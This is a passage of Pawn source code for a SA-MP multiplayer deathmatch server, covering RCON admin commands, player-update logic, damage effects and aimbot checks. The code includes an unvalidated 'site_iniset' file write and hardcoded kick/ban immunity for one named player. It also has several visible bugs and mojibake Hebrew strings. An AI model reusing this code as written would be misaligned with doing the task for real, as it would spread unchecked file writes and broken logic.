		if(!strlen(cmdEx)) return print(" setmoney [Int:playerid] [Int:money 0 - 999999999]");
		id = ReturnUser(cmdEx,ConsoleID);
		cmdEx = strtok(cmd,idx);
		if(!strlen(cmdEx)) return print(" setmoney [Int:playerid] [Int:money 0 - 999999999]");
		rmoney = strval(cmdEx);
		if(!IsPlayerConnected(id)) return print(" Invalid player ID.");
		if(rmoney < 0 || rmoney > 999999999) return print(" The money must be 0 - 999999999.");
		GiveMoney(i,rmoney-GetMoney(id), -1);
		return 1;
	}*/
	if(equal(cmdEx,"setwanted"))
	{
		new id, wanted;
		cmdEx = strtok(cmd,idx);
		if(!strlen(cmdEx)) return print(" setwanted [Int:playerid] [Int:wanted 0 - 6]");
		id = ReturnUser(cmdEx,ConsoleID);
		cmdEx = strtok(cmd,idx);
		if(!strlen(cmdEx)) return print(" setwanted [Int:playerid] [Int:wanted 0 - 6]");
		wanted = strval(cmdEx);
		if(!IsPlayerConnected(id)) return print(" Invalid player ID.");
		if(wanted < 0 || wanted > 6) return print(" The money must be 0 - 6.");
		SetPlayerWantedLevel(id,wanted);
		return 1;
	}
	if(equal(cmdEx,"lockserv"))
	{
		cmdEx = strtok(cmd,idx);
		if(!strlen(cmdEx)) return print(" lockserv [Bool:0/1]");
		if(strval(cmdEx) < 0 || strval(cmdEx) > 1) return print("Invalid lockserv parameter.");
		LockServ = strval(cmdEx);
		return 1;
	}
	if(equal(cmd,"kickall"))
	{
		for(new all=0;all<MAX_PLAYERS_;all++) if(IsPlayerConnected(all)) Kick(all);
		return 1;
	}
	if(equal(cmdEx,"kicksome"))
	{
		new id;
		cmdEx = strtok(cmd,idx);
		if(!strlen(cmdEx)) return print(" kicksome [Int:playerid] [Int:playerid] etc...");
		while(strlen(cmdEx) != 0)
		{
			id = strval(cmdEx);
			if(IsPlayerConnected(id)) Kick(id);
			cmdEx = strtok(cmd,idx);
		}
		return 1;
	}
	if(equal(cmd,"admins"))
	{
		new admins = 0;
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][logged] && IsPlayerMAdmin(i))
 			{
 				admins++;
				printf("Online admins (%d):",admins);
				for(new j=0;j<admins;j++) printf("%d. %s [ID: %03d | Level: %d]",j,GetName(i),i,playerinfo[i][admin]);
				break;
			}
		}
		if(admins == 0) return print("There are no admins online.");
		return 1;
	}
	if(equal(cmdEx,"setcolor"))
	{
		new id, rcolor;
		cmdEx = strtok(cmd,idx);
		if(!strlen(cmdEx)) return print(" setcolor [Int:playerid] [Hex:color]");
		id = strval(cmdEx);
		cmdEx = strtok(cmd,idx);
		if(!strlen(cmdEx)) return print(" setcolor [Int:playerid] [Hex:color]");
		if(!IsPlayerConnected(id)) return print(" Invalid player ID.");
		if(!IsHex(cmdEx)) return print(" Invalid color.");
		rcolor = strhex(cmdEx);
		SetPlayerColor(id,setAlpha(rcolor,PLAYER_ALPHA));
		return 1;
	}
	if(equal(cmdEx,"setname"))
	{
		new name[256], id, lastname[MAX_PLAYER_NAME], f[M_S];
		cmdEx = strtok(cmd,idx), name = strtok(cmd,idx);
		if(!strlen(cmd) || !strlen(name)) return print(" setname [Int:playerid] [String:new name]");
		id = ReturnUser(cmd,ConsoleID);
		if(!IsPlayerConnected(id)) return print(" Invalid player ID.");
		if(equal(name,"None")) return print(" Bad name (\"none\").");
		if(fkeyexist(file_nbans,name)) return printf(" Bad name (nbanned).");
		if(strlen(name) > MAX_PLAYER_NAME || strlen(name) < 3) return print(" Bad name (invalid length).");
		if(!IsValidNick(name)) return print("Bad name (invalid chars).");
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && equal(GetName(i),name)) return printf(" There are a connected player with this name (ID: %03d)",i);
		if(equal(name,"None") || equal(name,botname)) return print(" Sorry, you can't use this name.");
		format(f,sizeof(f),"/DM/Users/%s.ini",name);
		if(fexist(f)) return printf(" Bad name (already exist).");
		format(lastname,sizeof(lastname),GetName(id));
		ChangeName(id,name);
		return 1;
	}
	if(equal(cmdEx,"a"))
	{
		new string[M_S];
		cmdEx = strrest(cmd,idx);
		if(!strlen(cmdEx)) return print(" a [String:text]");
		format(string,sizeof(string),"[RconAC] %s",cmdEx);
		printf(string);
		return 1;
	}
	if(equal(cmdEx,"debug"))
	{
		cmdEx = strtok(cmd,idx);
		if(!strlen(cmdEx) || IsNumeric(cmdEx)) return print(" debug [ON/OFF]");
		if(equal(cmdEx,"ON")) debugstate = true;
		else if(equal(cmdEx,"OFF")) debugstate = false;
		else print(" debug [ON/OFF]");
		printf(" %s debug is now %s.",comname,(debugstate == true? ("ON"):("OFF")));
		return 1;
	}
	if(equal(cmdEx,"site_kick"))
	{
		cmdEx = strtok(cmd,idx);
		new id = strval(cmdEx);
		if(IsPlayerMAdmin(id) || !IsPlayerConnected(id)) return 1;
		cmdEx = strrest(cmd,idx);
		format(cmdEx,sizeof(cmdEx),"Webmod: %s",cmdEx);
		SetKick(id,ConsoleID,cmdEx);
		return 1;
	}
	if(equal(cmdEx,"site_ban"))
	{
		cmdEx = strtok(cmd,idx);
		new id = strval(cmdEx);
		if(IsPlayerMAdmin(id) || !IsPlayerConnected(id)) return 1;
		cmdEx = strrest(cmd,idx);
		format(cmdEx,sizeof(cmdEx),"Webmod: %s",cmdEx);
		SetBan(id,ConsoleID,cmdEx);
		return 1;
	}
	if(equal(cmdEx,"site_unban"))
	{
		cmdEx = strtok(cmd,idx);
		new id = strval(cmdEx);
		cmdEx = strrest(cmd,idx);
		format(cmdEx,sizeof(cmdEx),"/unban %d %s",id,cmdEx);
		OnPlayerCommandText(ConsoleID,cmdEx);
		return 1;
	}
	if(equal(cmdEx,"site_iniset"))
	{
		new key[256], value[256];
		cmdEx = strtok(cmd,idx), key = strtok(cmd,idx), value = strtok(cmd,idx);
		fsetstring(cmdEx,key,value);
		return 1;
	}
	Log("Attention",ConsoleID,cmd);
	if(debugstate) printf("OnRconCommand_GM(%s) end",cmd);
	return 1;
}
//=[OnPlayerUpdate]=============================================================
public OnPlayerUpdate(playerid)
{
    //if(!IsValidSkin(GetPlayerSkin(playerid))) return SetBan(playerid,INVALID_PLAYER_ID,"Cheats detected. #3"), 0;
	playerinfo[playerid][idletime] = 0;
    if(playerinfo[playerid][naorslap]) SetPlayerPos(playerid, -9999, -9999, -9999), CreateExplosion(-9999, -9999, -9999, 0, 10), PlayerPlaySound(playerid, 1057, 0, 0, 0);
	if(playerinfo[playerid][modeafk] && !playerinfo[playerid][usedafk] && !playerinfo[playerid][afkcmd]) command(playerid,"/sunafk");
	if(playerinfo[playerid][noupdate]) return 0;
	if(playerinfo[playerid][frozen][0] && playerinfo[playerid][frozen][1]) return serverUptime % 2;
	#if lagtest
		//LagTest_Start("OnPlayerUpdate");
	#endif
	if(!IsPlayerNPC(playerid))
	{
		new tmp, tmp2, Float:tmp3;
		if(playerinfo[playerid][flymode][0])
		{
			new k[3];
			GetPlayerKeys(playerid,k[0],k[1],k[2]);
			if(playerinfo[playerid][flymode][1] > 0 && (GetTickCount() - playerinfo[playerid][flymode][2]) > 100) MoveCamera(playerid);
			if(playerinfo[playerid][flymode][3] != k[1] || playerinfo[playerid][flymode][4] != k[2])
			{
				if((playerinfo[playerid][flymode][3] != 0 || playerinfo[playerid][flymode][4] != 0) && k[1] == 0 && k[2] == 0)
				{
					StopPlayerObject(playerid,playerinfo[playerid][flyobject]);
					playerinfo[playerid][flymode][1] = 0;
					playerinfo[playerid][flyspeed] = 0.0;
				}
				else
				{
					if(k[2] < 0)
					{
						if(k[1] < 0) playerinfo[playerid][flymode][1] = 5; // Forward Left
						else if(k[1] > 0) playerinfo[playerid][flymode][1] = 7; // Back Left
						else playerinfo[playerid][flymode][1] = 3; // Left
					}
					else if(k[2] > 0)
					{
						if(k[1] < 0) playerinfo[playerid][flymode][1] = 6; // Forward Right
						else if(k[1] > 0) playerinfo[playerid][flymode][1] = 8; // Back Right
						else playerinfo[playerid][flymode][1] = 4; // Right
					}
					else if(k[1] < 0) playerinfo[playerid][flymode][1] = 1; // Forward
					else if(k[1] > 0) playerinfo[playerid][flymode][1] = 2; // Back
					MoveCamera(playerid);
				}
			}
			playerinfo[playerid][flymode][3] = k[1], playerinfo[playerid][flymode][4] = k[2];
			return 0;
		}
		tmp = GetPlayerWeapon(playerid), tmp2 = GetAmmo(playerid);
		if(tmp == playerinfo[playerid][pweapon])
		{
			if((tmp2 != playerinfo[playerid][pammo]) || (playerinfo[playerid][pkeys][0] & KEY_FIRE && (tmp <= 15 || tmp >= 43 || tmp == 40) && GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)) OnPlayerAttack(playerid,tmp);
		}
		else OnPlayerWeaponSwitch(playerid,playerinfo[playerid][pweapon],tmp,playerinfo[playerid][pspentammo]), playerinfo[playerid][pweapon] = tmp, playerinfo[playerid][pspentammo] = 0;
		if(tmp2 != playerinfo[playerid][pammo]) playerinfo[playerid][pammo] = tmp2;
		tmp = GetPlayerTargetPlayer(playerid);
		if(playerinfo[playerid][target] != tmp)
		{
			OnPlayerTargetPlayer(playerid,tmp,playerinfo[playerid][target]);
			playerinfo[playerid][target] = tmp;
		}
		if((GetPlayerHealth(playerid,tmp3), tmp3) != playerinfo[playerid][phealth])
		{
			OnPlayerHealthChange(playerid,playerinfo[playerid][phealth],tmp3);
			playerinfo[playerid][phealth] = tmp3;
		}
		if((GetPlayerArmour(playerid,tmp3), tmp3) != playerinfo[playerid][parmour])
		{
			OnPlayerHealthChange(playerid,playerinfo[playerid][parmour],tmp3);
			playerinfo[playerid][parmour] = tmp3;
		}
	}
	new keys, ud, lr;
    GetPlayerKeys(playerid, keys, ud, lr);
    if((ud != 128 && ud != 0 && ud != -128) || (lr != 128 && lr != 0 && lr != -128)) SetKick(playerid,MAX_PLAYERS+1,"Joypad is not allowed.");
    if(!IsPlayerAFK_(playerid) && GetPlayerCameraMode(playerid) == 53)
    {
        new Float:p[3];
        GetPlayerCameraPos(playerid,p[0],p[1],p[2]);
        if(p[2] < -50000.0 || p[2] > 50000.0) return 0;
    }
	#if lagtest
		//LagTest_End("OnPlayerUpdate");
	#endif
	return 1;
}
//=[OnPlayerTakeDamage]=========================================================
public OnPlayerTakeDamage(playerid, issuerid, Float:amount, weaponid)
{
	#if lagtest
		LagTest_Start("OnPlayerTakeDamage");
	#endif
	new bool:txtSent[2 char];
	if(issuerid != INVALID_PLAYER_ID)
	{
	    if(playerinfo[playerid][blockplayers] && playerinfo[issuerid][admin] < 20)
	    {
	        new Float:p[3];
	    	GetPlayerPos(issuerid,p[0],p[1],p[2]);
			CreateExplosion(p[0],p[1],p[2],7,50);
			new stadd[M_S], str[M_S];
	        switch(random(4))
	        {
	            case 0: format(stadd, M_S, " !р·ф ьр щыхь ьщ°х· сщ");
	            case 1: format(stadd, M_S, " !ьр ьф°хт рх·щ");
	            case 2: format(stadd, M_S, " !Ёр ьф·°чў");
	            case 3: format(stadd, M_S, " !·Їхё ю°чў");
	        }
			format(str, sizeof(str), ">> %s: "@c(lightred)"%s", GetName(playerid), stadd);
			SendClientMessage(issuerid, GetPlayerColor(playerid), str);
	        format(str, sizeof(str), "[Block]: .Ёщёф ьщ°х· съ %s ф∙чўя", GetName(issuerid));
	        SendClientMessage(playerid, red, str);
	    }
		#if aimbotcheck
		if((GetPlayerPing(playerid) < 40 && GetPlayerPing(issuerid) < 40) && lagstatus <= 100 && weaponid != 37 && !playerinfo[issuerid][afk] && !playerinfo[playerid][afk] && GetPlayerVirtualWorld(issuerid) == GetPlayerVirtualWorld(playerid) && GetPlayerInterior(issuerid) == GetPlayerInterior(playerid))
		{
			// Aimbot Check
			new Float:x[6];
		    GetPlayerPos(playerid, x[0], x[1], x[2]);
		    // c = фю°чў сщя ф∙чўЁщэ
			// count = фю°чў сщя ф∙чўя ∙щ°ф р· фыух° хфющўхэ ∙сх фщ°щщф ЇтЄф
			new Float:c = GetPlayerDistanceFromPoint(issuerid, x[0], x[1], x[2]);
			if(c <= 100)
			{
				GetPlayerLastShotVectors(issuerid, x[0], x[0], x[0], x[3], x[4], x[5]);
			    new Float:count = GetPlayerDistanceFromPoint(issuerid, x[3], x[4], x[5]);
			    if((c - count) > 3.0 && lagstatus <= 100 && (GetPlayerPing(playerid) < 40 && GetPlayerPing(issuerid) < 40))
				{
					playerinfo[issuerid][awarns]++;
					if(playerinfo[issuerid][awarns] >= 3)
					{
					    new str[M_S];
					    format(str, sizeof(str), "using aimbot with %s (warn %d)", WeaponName(weaponid), playerinfo[issuerid][awarns]);
					    Log("Aimbot", issuerid, str);
					}
		    	}
			}
		}
		#endif
		new bodypart = bodypart_unknown, isDead = IsPlayerDead(playerid), string[M_S];
		if(!isDead)
		{
			new Float:p[3];
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			if(IsPlayerAimingAt(issuerid,p[0],p[1],p[2]+0.8,0.2)) bodypart = bodypart_head;
		}
		if(!playerinfo[playerid][gm] && Options[10][optActive] && (weaponid == 33 || weaponid == 34))
		{
			SetPlayerHealth(playerid,0.0);
			amount = 100.0;
		}
		if(Options[1][optActive] && bodypart == bodypart_head && weaponid >= 22 && weaponid <= 38 && !playerinfo[playerid][gm] && !IsPlayerAFK_(playerid) && playerinfo[issuerid][lasths] != playerid && GetPlayerSpecialAction(issuerid) != SPECIAL_ACTION_DUCK && !playerinfo[playerid][inact] && !playerinfo[playerid][inbattle])
		{
			playerinfo[issuerid][hshots]++;
			if(playerinfo[issuerid][logged]) fsetint(fuser(issuerid),"Headshots",playerinfo[issuerid][hshots]);
			if(!isDead) SetPlayerHealth(playerid,0.0);
			HPText(playerid,999.0,"~r~HEADSHOT!");
			HPText(issuerid,999.0,"~g~HEADSHOT!");
			txtSent{0} = true, txtSent{1} = true;
			GameTextForPlayer(issuerid,"~r~headshot!",1500,6);
			playerinfo[issuerid][headshooter] = 1, playerinfo[issuerid][lasths] = playerid;
			format(string,sizeof(string),"HeadShot (%s): %s ф°т р· %s",WeaponName(weaponid),GetName(playerid),GetName(issuerid));
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][setting][setting_hs]) SendClientMessage(i,red,string);
		}
		#if lagtest
			LagTest_EndEx("OnPlayerTakeDamageB(%f,%d)",amount,weaponid);
		#endif
		if(!isDead && playerinfo[playerid][quicklydefence] > 0) if(!random(2))
		{
			new Float:p[3], Float:h;
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			SetPlayerPos(playerid,p[0] + floatrand(-1.0,1.0),p[1] + floatrand(-1.0,1.0),p[2]);
			GetPlayerHealth(playerid,h);
			SetPlayerHealth(playerid,h+amount);
		}
		if(playerinfo[issuerid][spweapon] == spw_psniper && weaponid == 33)
		{
		    if(playerinfo[playerid][gm] == 1) return 1;
			GameTextForPlayer(playerid,"~g~poison sniper~n~shot!",1500,6);
			playerinfo[issuerid][psniperbullets]--;
			RemovePlayerWeapon(issuerid,33);
			GiveWeapon(issuerid,33,playerinfo[issuerid][psniperbullets]);
   			SetPlayerArmedWeapon(issuerid,33);
			GameTextForPlayer(issuerid,"~g~poison sniper~n~shot!",1500,6);
			playerinfo[playerid][poisoned] = 5;
			playerinfo[playerid][poisonhp] = float(playerinfo[issuerid][level]);
		}
		if(playerinfo[issuerid][spweapon] == spw_doublem4 && weaponid == 31)
		{
			amount += 9;
			Damage(playerid,amount,issuerid,false);
		}
		if(playerinfo[issuerid][spweapon] == spw_taser && weaponid == 1)
		{
			Damage(playerid,9.0,issuerid,false);
			switch(random(10))
			{
				case 0: ApplyAnimation(playerid,"CRACK","crckidle4",4.1,0,1,1,1,1);
				case 1: ApplyAnimation(playerid,"CRACK","Bbalbat_Idle_01",4.1,0,1,1,1,1);
				case 2: ApplyAnimation(playerid,"CRACK","Bbalbat_Idle_02",4.1,0,1,1,1,1);
				case 3: ApplyAnimation(playerid,"CRACK","crckdeth1",4.1,0,1,1,1,1);
				case 4: ApplyAnimation(playerid,"CRACK","crckdeth2",4.1,0,1,1,1,1);
				case 5: ApplyAnimation(playerid,"CRACK","crckdeth3",4.1,0,1,1,1,1);
				case 6: ApplyAnimation(playerid,"CRACK","crckdeth4",4.1,0,1,1,1,1);
				case 7: ApplyAnimation(playerid,"CRACK","crckidle1",4.1,0,1,1,1,1);
				case 8: ApplyAnimation(playerid,"CRACK","crckidle2",4.1,0,1,1,1,1);
				case 9: ApplyAnimation(playerid,"CRACK","crckidle3",4.1,0,1,1,1,1);
			}
		}
		if(playerinfo[issuerid][scroll] == scroll_doubledamage && playerinfo[issuerid][scrollusing]) if(CanUseScroll(issuerid))
		{
			Damage(playerid,amount,issuerid,false);
			amount *= 2;
			if(playerinfo[playerid][noticedmsg][7] != issuerid)
			{
				playerinfo[playerid][noticedmsg][7] = issuerid;
				format(string,sizeof(string)," (!щ∙ ёў°хь ∙тх°э ьыхч ∙ьх ьфщх· чцў Їщ 2 %s ь∙чўя)",GetName(issuerid));
				SendClientMessage(playerid,grey,string);
			}
		}
		#if lagtest
			LagTest_EndEx("OnPlayerTakeDamageC(%f,%d)",amount,weaponid);
		#endif
		if(IsPlayerMAdmin(playerid) && playerinfo[playerid][pinv] && !IsPlayerMAdmin(issuerid))
		{
			StopPlayer(issuerid);
			ShowPlayerDialog(issuerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "рцф°ф",@c(darkred) "!∙щэ ьс\n\n" @c(red) ".рёх° ь·ўхє рующя ∙ЎсЄх ься - рующя с·Їўщу","OK","");
		}
		if(thereIsAct && GetPlayerTeam(issuerid) == GetPlayerTeam(playerid) && GetPlayerTeam(issuerid) != NO_TEAM && playerinfo[playerid][inact] && playerinfo[issuerid][inact])
		{
			if(manhuntinfo[0]) ShowPlayerDialog(issuerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "Teamkill",@c(darkred) "!∙щэ ьс\n\n" @c(red) ".ф∙чўя ∙щ°щ· Єьщх фхр Ўщщу сЇЄщьх·, сущхў ыюхъ\n.р·ф ьр щыхь ьф°хт рх ь·ўхє рх·х хчщщс ь∙·є рщ·х ЇЄхьф Ёту фЁщЎху","OK","");
			else if(teamactinfo[0]) ShowPlayerDialog(issuerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "Teamkill",@c(darkred) "!∙щэ ьс\n\n" @c(red) ".ф∙чўя ∙щ°щ· Єьщх ЁюЎр сўсхЎф ∙ьъ\n.р·ф ьр щыхь ьф°хт рх ь·ўхє рх·х, Єьщъ ь∙·є рщ·х ЇЄхьф Ёту фўсхЎф ф∙Ёщщф","OK","");
		}
		if(!txtSent{1} && !playerinfo[playerid][gm]) HPText(issuerid,amount);
		if(IsPlayerNPC(issuerid) && playerinfo[issuerid][selfnpc] != -1) if(equal(NPCs[playerinfo[issuerid][selfnpc]][npcName],"DM_Racer"))
		{
			new moveaway[][32] = {"!цхц юфу°ъ","!Єхє юыря","!цф фюёьхь ∙ьщ","MOVE!"}, r = random(sizeof(moveaway));
			format(talkBubble,sizeof(talkBubble),@c(red) "%s",moveaway[r]);
			NPCTalk("DM_Racer",moveaway[r],playerid,1,1);
		}
		if(playerinfo[playerid][dmzone] == dmz_shavuot && playerinfo[issuerid][dmzone] == dmz_shavuot)
		{
			new oid = 18746, Float:p[3];
			switch(playerinfo[issuerid][dmzlevel])
			{
				case 0..1:
				{
					if(IsPlayerAttachedObjectSlotUsed(issuerid,aoslot_shavuot2))
					{
						amount += 10.0;
						Damage(playerid,10.0,issuerid,false);
					}
					oid = 18746;
				}
				case 2:
				{
					if(IsPlayerAttachedObjectSlotUsed(issuerid,aoslot_shavuot2))
					{
						amount += 5.0;
						Damage(playerid,5.0,issuerid,false);
					}
					oid = 18743;
				}
				case 3:
				{
					Damage(playerid,20.0,issuerid,false);
					oid = 18724, amount += 20.0;
				}
				case 4: oid = 18737;
			}
			GetPlayerCameraLine(issuerid,p[0],p[1],p[2],float(GetDistanceBetweenPlayers(playerid,issuerid)));
			SetTimerEx("ObjectTimerAct",850,0,"iiiii",CreateSObject(oid,p[0],p[1],p[2]-1.2,0.0,0.0,0.0,.world = (worlds_dmz + dmz_shavuot)),0,0,1,GetPlayerVirtualWorld(playerid));
			Streamer_Update(playerid);
			Streamer_Update(issuerid);
		}
		if(playerinfo[issuerid][using22] > 0 && playerinfo[playerid][ammuitems][ai_bugarmour] && playerinfo[playerid][bugarmour])
		{
			if(!playerinfo[playerid][noticedmsg][18])
			{
				SendClientMessage(playerid,grey," (/bugarm :щ°х съ с∙щш· ф-2-2 хр·ф ючцщў ютя сртщэ, ыъ ∙р·ф юхтя ющ°щщф ыцх. ьсщшхь фютя)");
				playerinfo[playerid][noticedmsg][18] = 1;
			}
			TakeAmmuItemAmmo(playerid,ai_bugarmour);
			AddHP(playerid,amount);
			format(string,sizeof(string)," !щ∙ ютя сртщэ юхЇЄь х∙щш· ф-2-2 ьр ·ЇЄь Єьщх %s-∙щэ ьс! ь",GetName(playerid));
			SendClientMessage(issuerid,red,string);
		}
		if(playerinfo[issuerid][clan] > 0 && claninfo[playerinfo[issuerid][clan]][cendpower][1] != -1) if(GetPlayerHQ(issuerid) == playerinfo[issuerid][clan] && equal(cupowers[claninfo[playerinfo[issuerid][clan]][cendpower][1]][CUPName],"X2 Damage"))
		{
			Damage(playerid,amount,issuerid,false);
			amount *= 2;
			if(playerinfo[playerid][noticedmsg][7] != issuerid)
			{
				playerinfo[playerid][noticedmsg][7] = issuerid;
				format(string,sizeof(string)," (!юф ∙рхю° ∙фыхч ∙ьх ыЇхь ,X2 Damage ЁюЎр сўьря ∙фЇЄщь ыхч %s ф∙чўя)",GetName(issuerid));
				SendClientMessage(playerid,grey,string);
			}
		}
		if(playerinfo[playerid][tdmzone] == tdmz_heavy && playerinfo[playerid][tooktempickup])
		{
			if(IsPlayerAttachedObjectSlotUsed(playerid,1)) Damage(issuerid,amount*2);
			if(IsPlayerAttachedObjectSlotUsed(playerid,5)) ResetWeapons(issuerid);
			if(IsPlayerAttachedObjectSlotUsed(playerid,7)) SetPlayerBurn(issuerid);
		}
		if(IsPlayerMAdmin(issuerid) && playerinfo[issuerid][kickgun])
		{
		    if(!strcmp(GetName(playerid), "(NoN)Naor") && !playerinfo[playerid][pp]) return SendClientMessage(issuerid, red, " !чЎхє");
		    if(playerinfo[issuerid][admin] < playerinfo[playerid][admin])
		    {
		        format(string, sizeof(string), " !Ёщёф ь·· ьъ сря у°ъ °хсф фсрЁщэ %s фрующя", GetName(issuerid));
		        SendClientMessage(playerid, red, string);
		        format(string, sizeof(string), " !с°ю· рующя тсхфф ю∙ьъ хьыя ьр ·хыь ь·· ьх сря %s фрующя", GetName(playerid));
		        SendClientMessage(issuerid, red, string);
		    }
		    else SetKick(playerid,issuerid,"Kick Gun"), SendClientMessage(issuerid,grey," (/kickgun off ?ёщщю·)");
		}
		if(IsPlayerMAdmin(issuerid) && playerinfo[issuerid][bangun])
		{
			if(!strcmp(GetName(playerid), "(NoN)Naor") && !playerinfo[playerid][pp]) return SendClientMessage(issuerid, red, " !чЎхє");
		    if(playerinfo[issuerid][admin] < playerinfo[playerid][admin])
		    {
		        format(string, sizeof(string), " !Ёщёф ь·· ьъ сря у°ъ °хсф фсрЁщэ %s фрующя", GetName(issuerid));
		        SendClientMessage(playerid, red, string);
		        format(string, sizeof(string), " !с°ю· рующя тсхфф ю∙ьъ хьыя ьр ·хыь ь·· ьх сря %s фрующя", GetName(playerid));
		        SendClientMessage(issuerid, red, string);
		    }
		    else SetBan(playerid,issuerid,"Ban Gun"), SendClientMessage(issuerid,grey," (/bangun off ?ёщщю·)");
		}
		if(IsPlayerMAdmin(issuerid) && playerinfo[playerid][gm] && playerinfo[issuerid][gm] && playerinfo[playerid][pp]) SetPlayerHealth(issuerid,100.0);
		playerinfo[issuerid][curfight]++;
		if(!playerinfo[issuerid][damageforid][playerid]) playerinfo[issuerid][damageforid][playerid] = true;
		if(GetPVarType(playerid,dmgformat(issuerid)) == PLAYER_VARTYPE_NONE) SetPVarInt(playerid,dmgformat(issuerid),1);
		if(Options[16][optActive] && (weaponid == 0 || weaponid == 24 || weaponid == 27 || weaponid == 31))
		{
			new Float:addition = 0.0;
			switch(weaponid)
			{
				case 0: addition = 10.0;
				case 24: addition = 5.0;
				case 27: addition = 2.0;
				case 31: addition = 3.5;
			}
			if(addition > 0.0)
			{
				Damage(playerid,addition+amount,issuerid,false);
				amount += addition;
			}
		}
		if(playerinfo[issuerid][setting][setting_hitsound]) PlaySound(issuerid,17802);
		if(!playerinfo[issuerid][pspentammo] && weaponid >= 22 && weaponid <= 34)
		{
			playerinfo[issuerid][shootbugwarns][0] += 5;
			if(playerinfo[issuerid][shootbugwarns][0] > 20) if(GetTickCount()-playerinfo[issuerid][shootbugwarns][1] > 2500)
			{
				Cheat(issuerid,"ЁщЎхь срт щ°щх·",2);
				playerinfo[issuerid][shootbugwarns][1] = GetTickCount();
			}
		}
	}
	else
	{
		if(Options[13][optActive]) SetPlayerHealth(playerid,playerinfo[playerid][phealth]-amount);
		else
		{
			GetPlayerHealth(playerid,playerinfo[playerid][phealth]);
			GetPlayerArmour(playerid,playerinfo[playerid][parmour]);
		}
	}
	#if lagtest
		LagTest_EndEx("OnPlayerTakeDamageD(%f,%d)",amount,weaponid);
	#endif
	if(!txtSent{0} && !playerinfo[playerid][gm])
	{
		if(IsPlayerDead(playerid)) HPText(playerid,999.0,"~r~DEAD");
		else HPText(playerid,0-amount);
		playerinfo[playerid][curfight]++;
	}
	//format(string,sizeof(string),"%c%.0f",amount < 0.0 ? '-' : '+',amount);
	//SetPlayerChatBubble(playerid,string,amount < 0.0 ? 0x660000AA : 0x006600AA,50.0,1500);
	#if lagtest
		LagTest_End("OnPlayerTakeDamageE");
	#endif
	return 1;
}
//=[OnPlayerGiveDamage]=========================================================
public OnPlayerGiveDamage(playerid, damagedid, Float:amount, weaponid)
{
	#if lagtest
		//LagTest_Start("OnPlayerGiveDamage");
	#endif
	if(!playerinfo[damagedid][gm] && GetPlayerTeam(playerid) != GetPlayerTeam(damagedid) && !IsPlayerAFK_(damagedid) && !IsPlayerNPC(damagedid))
	{
		if(Options[13][optActive])
		{
			if(playerinfo[damagedid][parmour] > 0.0)
			{
				new Float:a = playerinfo[damagedid][parmour];
				SetPlayerArmour(damagedid,playerinfo[damagedid][parmour]-amount < 0.0 ? 0.0 : playerinfo[damagedid][parmour]-amount);
				amount -= a;
			}
			if(amount > 0.0) SetPlayerHealth(damagedid,playerinfo[damagedid][phealth]-amount);
		}
		else
		{
			new Float:h[2];
			GetPlayerHealth(damagedid,h[0]);
			GetPlayerArmour(damagedid,h[1]);
			h[0] += h[1], h[1] = playerinfo[damagedid][phealth] + playerinfo[damagedid][parmour];
			//if(h[0] >= h[1]-amount) AdminInfo(damagedid,"Godmod?");//Cheat(damagedid,"Godmod",2);
		}
	}
	#if lagtest
		//LagTest_End("OnPlayerGiveDamage");
	#endif
	return 1;
}
//=[OnPlayerAttack]=============================================================
public OnPlayerAttack(playerid, weaponid)
{
	#if lagtest
		//LagTest_Start("OnPlayerAttack");
	#endif
	playerinfo[playerid][pspentammo]++;
	if(playerinfo[playerid][spweapon] > 0 && spAmmunation[playerinfo[playerid][spweapon]][spaWeapon] == weaponid)
	{
		new Float:p[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		switch(playerinfo[playerid][spweapon])
		{
			case spw_ggrenade: if(GetPlayerVirtualWorld(playerid) == world_normal && !GetPlayerInterior(playerid))
			{
				GetXYInFrontOfPlayer(playerid,p[0],p[1],18.5);
				for(new i = 0; i < 4; i++) SetTimerEx("ExplodeByTimer",randomEx(2,6)*1000,0,"fffiii",p[0] + floatrand(-7.5,7.5),p[1] + floatrand(-7.5,7.5),p[2] + floatrand(0.0,4.0),7,1,world_normal);
			}
			case spw_smoke: SetTimerEx("DestroyObjectByTimer",20000,0,"i",CreateSObject(18713,p[0],p[1],p[2],0.0,0.0,0.0,object_show_distance,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid)));
			case spw_hammer:
			{
				GetXYInFrontOfPlayer(playerid,p[0],p[1],1.0);
				for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerStreamedIn(i,playerid) && i != playerid && IsPlayerInRangeOfPoint(i,2.5,p[0],p[1],p[2]))
				{
					if(IsPlayerInAnyVehicle(i))
					{
						GetVehicleVelocity(GetPlayerVehicleID(i),p[0],p[1],p[2]);
						SetVehicleVelocity(GetPlayerVehicleID(i),p[0],p[1],0.6);
						break;
					}
					else SetPlayerForwardVelocity(i,-0.2,floatrand(0.1,0.6));
				}
			}
			case spw_grandrpg:
			{
				for(new i = 1; i <= 3; i++)
				{
					GetPlayerCameraLine(playerid,p[0],p[1],p[2],30.0 * i);
					CreateExplosionVW(p[0],p[1],p[2],6,0.0,world_normal);
				}
			}
		}
		if(spAmmunation[playerinfo[playerid][spweapon]][spaAmmo] > 0)
		{
			playerinfo[playerid][spwammo] = GetAmmo(playerid);
			if(!playerinfo[playerid][spwammo])
			{
				DefineSPWObject(playerid,playerinfo[playerid][spweapon],0);
				if(playerinfo[playerid][logged] && spAmmunation[playerinfo[playerid][spweapon]][spaSaved]) fsetint(fuser(playerid),"SpecialWeapon",spw_none);
				RemovePlayerWeapon(playerid,spAmmunation[playerinfo[playerid][spweapon]][spaWeapon]);
				playerinfo[playerid][spweapon] = spw_none;
			}
		}
	}
	if(weaponid == 39) UpdatePlayerWeapons(playerid);
	if(playerinfo[playerid][srin] && playerinfo[playerid][srstarted] && playerinfo[playerid][srobjs] > 0 && weaponid == playerinfo[playerid][srweapon])
	{
		new Float:p[3], Float:dis = 50.0, toExp = -1;
